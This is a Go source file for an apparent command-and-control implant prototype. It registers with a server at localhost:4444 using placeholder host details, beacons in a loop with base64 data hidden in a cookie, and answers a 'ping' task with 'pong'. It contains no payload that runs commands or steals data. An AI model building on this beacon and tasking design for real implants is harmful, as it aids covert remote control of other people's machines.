package implant

import (
	"bytes"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func Do() {
	// === Example Data ===
	messageType := uint16(0x01)        // 2 bytes
	pid := uint32(1000)                // 4 bytes
	sessionID := uint32(0x12345678)    // 4 bytes
	ip := [4]byte{192, 168, 1, 100}    // 4 bytes
	sleep := uint32(10)				   // 4 bytes
	port := uint16(8080)               // 2 bytes
	arch := byte(1)                    // 1 byte
	procName := "procname"
	machine := "machine1"
	user := "pedro"

	// === Data Section ===
	dataFields := [][]byte{
		[]byte(procName),
		[]byte(machine),
		[]byte(user),
	}
	dataSection := []byte{}
	c := 1
	for _, field := range dataFields {
		dataSection = append(dataSection, field...)
		if c < 3 {
			dataSection = append(dataSection, 0x00) // Null separator
			c+=1
		}
	}
	dataLen := uint16(len(dataSection)) // 2 bytes

	// === Buffer Assembly ===
	buf := new(bytes.Buffer)

	// Write fields in order
	binary.Write(buf, binary.BigEndian, messageType)
	binary.Write(buf, binary.BigEndian, pid)
	binary.Write(buf, binary.BigEndian, sessionID)
	binary.Write(buf, binary.BigEndian, ip)
	binary.Write(buf, binary.BigEndian, port)
	binary.Write(buf, binary.BigEndian, sleep)
	buf.WriteByte(arch)
	binary.Write(buf, binary.BigEndian, dataLen)
	buf.Write(dataSection)

	// === POST Request ===
	url := "http://localhost:4444/"

	fmt.Println(dataSection)
	p := base64.StdEncoding.EncodeToString(buf.Bytes())

	resp, err := http.Post(url, "application/octet-stream", bytes.NewReader([]byte(p)))
	if err != nil {
		fmt.Println("POST request error:", err)
		os.Exit(1)
	}
	defer resp.Body.Close()
	fmt.Println("POST sent! Status:", resp.Status)


	client := &http.Client{}
	request,_ := http.NewRequest("GET", url, nil)
	for {
		messageType1 := uint16(0x02)
		buf2 := new(bytes.Buffer)
		binary.Write(buf2, binary.BigEndian, messageType1)
		binary.Write(buf2, binary.BigEndian, pid)
		binary.Write(buf2, binary.BigEndian, sessionID)
		binary.Write(buf2, binary.BigEndian, ip)
		binary.Write(buf2, binary.BigEndian, port)
		binary.Write(buf2, binary.BigEndian, sleep)
		buf2.WriteByte(arch)
		p := base64.StdEncoding.EncodeToString(buf2.Bytes())
		request.Header.Add("Cookie", "a="+p)
		resp, err := client.Do(request)
		if err != nil {
			log.Fatal(err)
		}
		fmt.Printf("GET sent with payload %s | Got Status:%s\n", p, resp.Status)

		b := base64.NewDecoder(base64.StdEncoding, resp.Body)
		var ID [8]byte
		var Code uint16
		var pLen uint32
		binary.Read(b, binary.BigEndian, &Code)
		binary.Read(b, binary.BigEndian, &ID)
		binary.Read(b, binary.BigEndian, &pLen)
		payload := make([]byte, pLen)
		binary.Read(b, binary.BigEndian, &payload)
		fmt.Printf("Task %s received code:%d payload len:%d payload:%s\n", string(ID[:]), Code, pLen, string(payload))

		if Code == 0x01 {
			responseTaskPayload := "pong"

			buf3 := new(bytes.Buffer)
			var messageType2 uint16 = 0x03
			binary.Write(buf3, binary.BigEndian, messageType2)
			binary.Write(buf3, binary.BigEndian, pid)
			binary.Write(buf3, binary.BigEndian, sessionID)
			binary.Write(buf3, binary.BigEndian, ip)
			binary.Write(buf3, binary.BigEndian, port)
			binary.Write(buf3, binary.BigEndian, sleep)
			buf3.WriteByte(arch)

			binary.Write(buf3, binary.BigEndian, ID)
			binary.Write(buf3, binary.BigEndian, uint32(len(responseTaskPayload)))
			responseTaskPayloadByte := make([]byte, uint32(len(responseTaskPayload)))
			copy(responseTaskPayloadByte[:], []byte(responseTaskPayload))
			binary.Write(buf3, binary.BigEndian, &responseTaskPayloadByte)


			taskRest := base64.StdEncoding.EncodeToString(buf3.Bytes())
			resp, err := http.Post(url, "application/octet-stream", bytes.NewReader([]byte(taskRest)))
			if err != nil {
				fmt.Println("POST request error:", err)
				os.Exit(1)
			}
			defer resp.Body.Close()
			fmt.Printf("Response sent with POST payload:%s Got Status:%s\n", taskRest, resp.Status)
		}

		time.Sleep(time.Duration(sleep) * time.Second)
	}
}